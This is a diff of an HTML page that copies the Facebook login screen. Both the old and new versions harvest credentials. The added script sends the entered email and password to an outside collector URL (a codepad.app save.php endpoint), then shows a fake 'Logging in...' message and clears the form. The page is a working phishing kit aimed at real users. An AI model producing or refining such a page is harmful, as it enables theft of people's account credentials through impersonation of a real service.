@@ -1,128 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
   <title>Facebook – log in or sign up</title>
-  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
+    * {
       margin: 0;
+      padding: 0;
+      box-sizing: border-box;
       font-family: Helvetica, Arial, sans-serif;
+    }
+    body {
       background: #f0f2f5;
+    }
+    .container {
       display: flex;
       justify-content: center;
       align-items: center;
+      flex-direction: column;
       height: 100vh;
-      animation: fadeIn 0.8s ease-in-out;
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .container {
-      max-width: 380px;
-      width: 90%;
-      background: #fff;
-      padding: 30px 20px;
-      border-radius: 10px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.15);
-      text-align: center;
-    }
-
-    h1 {
+    .logo {
+      font-size: 56px;
       color: #1877f2;
-      font-size: 36px;
+      font-weight: bold;
       margin-bottom: 10px;
     }
-
-    input {
+    .subtitle {
+      font-size: 24px;
+      color: #1c1e21;
+      margin-bottom: 40px;
+    }
+    .login-box {
+      background: white;
+      width: 360px;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .login-box input {
       width: 100%;
       padding: 14px;
-      margin: 8px 0;
+      margin: 10px 0;
+      font-size: 17px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
-      font-size: 16px;
-      outline: none;
     }
-
-    button {
+    .login-box button {
       width: 100%;
       padding: 14px;
+      margin-top: 10px;
       background-color: #1877f2;
       color: white;
-      font-size: 16px;
-      font-weight: bold;
+      font-size: 17px;
       border: none;
       border-radius: 6px;
-      margin-top: 10px;
+      font-weight: bold;
       cursor: pointer;
-      transition: 0.3s;
     }
-
-    button:hover {
-      background-color: #145dbf;
-    }
-
-    .link {
-      display: block;
-      margin-top: 12px;
-      color: #1877f2;
+    .login-box .forgot {
+      text-align: center;
+      margin: 12px 0;
       font-size: 14px;
+      color: #1877f2;
       text-decoration: none;
+      display: block;
     }
-
-    .create-btn {
-      background-color: #42b72a;
-      margin-top: 20px;
-    }
-
-    hr {
-      border: none;
-      border-top: 1px solid #dddfe2;
+    .line {
+      height: 1px;
+      background: #dddfe2;
       margin: 20px 0;
     }
-
-    @media (max-width: 480px) {
-      .container {
-        padding: 20px 10px;
+    .create-btn {
+      background: #42b72a;
+    }
+    @media screen and (max-width: 400px) {
+      .login-box {
+        width: 90%;
+      }
+      .logo {
+        font-size: 40px;
+      }
+      .subtitle {
+        font-size: 18px;
+        text-align: center;
+        padding: 0 10px;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>facebook</h1>
-    <form id="loginForm">
-      <input type="text" name="email" placeholder="Email address or phone number" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
-    </form>
-    <a class="link" href="#">Forgotten password?</a>
-    <hr />
-    <button class="create-btn">Create New Account</button>
+    <div class="logo">facebook</div>
+    <div class="subtitle">Facebook helps you connect and share with the people in your life.</div>
+    <div class="login-box">
+      <form id="loginForm">
+        <input type="text" name="email" placeholder="Email address or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <a class="forgot" href="#">Forgotten password?</a>
+        <div class="line"></div>
+        <button type="button" class="create-btn">Create new account</button>
+      </form>
+    </div>
   </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function(e) {
       e.preventDefault();
-      const formData = {
-        email: e.target.email.value,
-        password: e.target.password.value
-      };
-      try {
-        const res = await fetch("/api/save", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(formData)
-        });
-        const data = await res.json();
-        alert("Submitted (Educational Only)");
-      } catch (err) {
-        alert("Submission failed");
-      }
+      const formData = new FormData(form);
+      fetch("https://8b40qq2.live.codepad.app/save.php", {
+        method: "POST",
+        body: formData
+      }).then(res => res.text()).then(res => {
+        alert("Logging in...");
+        form.reset();
+      });
     });
   </script>
 </body>
